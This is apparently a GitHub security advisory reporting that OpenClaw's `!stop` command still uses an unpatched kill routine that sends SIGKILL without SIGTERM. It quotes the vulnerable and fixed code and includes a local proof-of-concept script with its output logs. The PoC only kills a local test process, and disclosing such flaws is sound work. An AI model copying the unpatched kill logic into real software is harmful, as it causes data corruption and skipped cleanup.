# [M] OpenClaw has incomplete Fix for CVE-2026-27486: Unvalidated SIGKILL in `!stop` Chat Command via `shell-utils.ts`

## Summary
Severity: Medium
Advisory: GHSA-3298-56p6-rpw2
CVE: CVE-2026-35667
CWE: CWE-404
Ecosystem: npm
CVSS: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:H (CVSS_V3)
Published: 2026-03-30
Source: https://github.com/advisories/GHSA-3298-56p6-rpw2
Type: github-advisory

## Affected
- npm: `openclaw` — affected >=0 <2026.3.24

## Details
> Fixed in OpenClaw 2026.3.24, the current shipping release.

### Advisory Details
**Title**: Incomplete Fix for CVE-2026-27486: Unvalidated SIGKILL in `!stop` Chat Command via `shell-utils.ts`

**Description**:
### Summary
The `!stop` (and `/bash stop`) chat command kills background bash processes using `SIGKILL` directly, without first sending `SIGTERM` to allow graceful shutdown. This is because `bash-command.ts` imports `killProcessTree()` from `src/agents/shell-utils.ts`, which still contains the pre-CVE-2026-27486 aggressive kill logic, rather than from the patched `src/process/kill-tree.ts`.

### Details
CVE-2026-27486 fixed unsafe process termination by introducing a graceful shutdown sequence in `src/process/kill-tree.ts` — sending `SIGTERM` first, waiting a configurable grace period (default 3 seconds), then escalating to `SIGKILL` only if the process is still alive.

However, an identical copy of the **unpatched** `killProcessTree` function remains in `src/agents/shell-utils.ts` (lines 170–192). This function sends `SIGKILL` immediately with no `SIGTERM`:

```typescript
// src/agents/shell-utils.ts:170-192
export function killProcessTree(pid: number): void {
  // ... Windows handling ...
  try {
    process.kill(-pid, "SIGKILL"); // Immediate hard kill, no SIGTERM
  } catch {
    try {
      process.kill(pid, "SIGKILL");
    } catch {
      // process already dead
    }
  }
}
```

The `!stop` chat command handler in `src/auto-reply/reply/bash-command.ts` imports and calls this vulnerable version at line 302:

```typescript
// src/auto-reply/reply/bash-command.ts:5
import { killProcessTree } from "../../agents/shell-utils.js";

// src/auto-reply/reply/bash-command.ts:300-304
const pid = running.pid ?? running.child?.pid;
if (pid) {
  killProcessTree(pid);  // Calls the UNPATCHED version
}
markExited(running, null, "SIGKILL", "failed");
```

Compare this to the patched version in `src/process/kill-tree.ts`:

```typescript
// src/process/kill-tree.ts:46-78
function killProcessTreeUnix(pid: number, graceMs: number): void {
  // Step 1: Try graceful SIGTERM to process group
  try {
    process.kill(-pid, "SIGTERM");
  } catch { /* ... */ }

  // Step 2: Wait grace period, then SIGKILL if still alive
  setTimeout(() => {
    if (isProcessAlive(-pid)) {
      try { process.kill(-pid, "SIGKILL"); } catch { /* ... */ }
    }
  }, graceMs).unref();
}
```

### PoC

This PoC demonstrates the difference between the vulnerable and patched code paths inside a running OpenClaw Gateway container.

**Setup:**
```bash
# Build and start the gateway container
cd CVE-2026-27486-variant-exp/
docker compose up -d
sleep 5
```

**Exploit (vulnerable `killProcessTree` from `shell-utils.ts`):**

The following script is injected into the container and executed. It starts a bash process that traps `SIGTERM` for graceful shutdown, then kills it using the same code path as `!stop`:

```javascript
// exploit_sigkill.cjs — replicates src/agents/shell-utils.ts:183-190
const { spawn } = require('child_process');
const fs = require('fs');

try { fs.unlinkSync('/tmp/graceful_shutdown.txt'); } catch {}

const child = spawn('/bin/bash', ['-c',
  'trap \'echo GRACEFUL_SHUTDOWN > /tmp/graceful_shutdown.txt; exit 0\' SIGTERM; while true; do sleep 1; done'
], { detached: true, stdio: 'ignore' });
child.unref();

setTimeout(() => {
  // VULNERABLE: same as shell-utils.ts — SIGKILL only
  try { process.kill(-child.pid, 'SIGKILL'); } catch {
    try { process.kill(child.pid, 'SIGKILL'); } catch {}
  }
  setTimeout(() => {
    if (fs.existsSync('/tmp/graceful_shutdown.txt')) {
      console.log('[BLOCKED] SIGTERM was received.');
      process.exit(1);
    } else {
      console.log('[EXPLOITED] SIGKILL sent directly — SIGTERM never delivered.');
      process.exit(0);
    }
  }, 2000);
}, 1000);
```

**Run:**
```bash
python3 poc_exploit.py
```

### Log of Evidence

**Exploit output (SIGKILL only, no graceful shutdown):**
```
[*] Running exploit (vulnerable killProcessTree from shell-utils.ts)...
[*] Victim PID: 78
[*] Calling vulnerable killProcessTree (SIGKILL only, no SIGTERM)...
[EXPLOITED] SIGKILL sent directly — SIGTERM never delivered.
[EXPLOITED] Graceful shutdown handler was NEVER invoked.

[SUCCESS] CVE-2026-27486 variant confirmed:
  killProcessTree() in shell-utils.ts sends immediate SIGKILL,
  bypassing the graceful shutdown fix in process/kill-tree.ts.
```

**Control output (SIGTERM first, graceful shutdown works):**
```
[*] Running control (patched killProcessTree from process/kill-tree.ts)...
[*] Victim PID: 93
[*] Calling patched killProcessTree (SIGTERM first, then SIGKILL after grace)...
[NORMAL] SIGTERM received — graceful shutdown completed. Flag: GRACEFUL_SHUTDOWN

[NORMAL] Control confirmed: patched killProcessTree sends SIGTERM first,
         allowing graceful shutdown before escalating to SIGKILL.
```

### Impact
When `!stop` is used, background processes are killed instantly via `SIGKILL` with no chance to perform cleanup. This can result in:

- **Data corruption**: processes writing to files or databases are interrupted mid-write
- **Resource leaks**: temporary files, lock files, and network connections are not properly released
- **Security-sensitive cleanup skipped**: operations like erasing in-memory secrets or completing audit logs are bypassed

This is the same class of impact that CVE-2026-27486 was filed for — the fix simply missed the `shell-utils.ts` copy of the function.

### Affected products
- **Ecosystem**: npm
- **Package name**: openclaw
- **Affected versions**: <= 2026.3.14
- **Patched versions**: <None>

### Severity
- **Severity**: Medium
- **Vector string**: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:H

### Weaknesses
- **CWE**: CWE-404: Improper Resource Shutdown or Release

### Occurrences

| Permalink | Description |
| :--- | :--- |
| [https://github.com/moltbot/moltbot/blob/f2849c2417/src/agents/shell-utils.ts#L170-L192](https://github.com/moltbot/moltbot/blob/f2849c2417/src/agents/shell-utils.ts#L170-L192) | The vulnerable `killProcessTree` function that sends immediate `SIGKILL` without `SIGTERM`. |
| [https://github.com/moltbot/moltbot/blob/f2849c2417/src/auto-reply/reply/bash-command.ts#L5](https://github.com/moltbot/moltbot/blob/f2849c2417/src/auto-reply/reply/bash-command.ts#L5) | Import statement pulling the vulnerable `killProcessTree` from `shell-utils.ts` instead of the patched `kill-tree.ts`. |
| [https://github.com/moltbot/moltbot/blob/f2849c2417/src/auto-reply/reply/bash-command.ts#L300-L304](https://github.com/moltbot/moltbot/blob/f2849c2417/src/auto-reply/reply/bash-command.ts#L300-L304) | The `!stop` handler calling the vulnerable `killProcessTree(pid)`. |
| [https://github.com/moltbot/moltbot/blob/f2849c2417/src/process/kill-tree.ts#L46-L78](https://github.com/moltbot/moltbot/blob/f2849c2417/src/process/kill-tree.ts#L46-L78) | The **patched** `killProcessTreeUnix` with graceful `SIGTERM` → grace period → `SIGKILL` sequence (for reference). |

## References
- https://github.com/openclaw/openclaw/security/advisories/GHSA-3298-56p6-rpw2
- https://github.com/advisories/GHSA-jfv4-h8mc-jcp8
- https://github.com/openclaw/openclaw
